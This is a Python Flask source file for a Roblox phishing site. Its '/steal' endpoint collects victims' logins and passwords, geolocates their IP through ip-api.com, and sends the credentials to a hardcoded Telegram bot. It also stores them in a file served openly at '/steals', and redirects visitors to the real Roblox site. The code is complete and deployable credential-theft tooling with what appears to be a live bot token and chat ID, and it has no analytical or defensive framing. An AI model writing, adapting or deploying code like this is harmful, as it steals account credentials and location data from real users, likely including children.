from flask import Flask, request, redirect, render_template
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"
LOG_FILE = "visits.txt"
STEALS_FILE = "steals.txt"
REDIRECT_URL = "https://www.roblox.com/"

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
        d = r.json()
        if d['status'] == 'success':
            return f"{d['country']}, {d['city']} ({d['isp']})"
    except:
        pass
    return "Unknown"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except Exception as e:
        print(f"Telegram error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')

    # Определяем IP жертвы
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    geo = get_geo(ip)

    # Формируем сообщение для Telegram
    msg = (
        f"🎮 НОВЫЙ ЛОГИН ROBLOX!\n"
        f"🧑 Логин: {login}\n"
        f"🔑 Пароль: {password}\n"
        f"🌐 IP: {ip}\n"
        f"📍 Гео: {geo}"
    )

    # Отправляем в Telegram
    send_tg(msg)

    # Сохраняем в файл
    with open(STEALS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | IP: {ip} | {geo} | {login} | {password}\n")

    return {"status": "ok"}, 200

@app.route('/logs')
def logs():
    if not os.path.exists(LOG_FILE):
        return "No logs"
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

@app.route('/steals')
def steals():
    if not os.path.exists(STEALS_FILE):
        return "No steals"
    with open(STEALS_FILE, 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
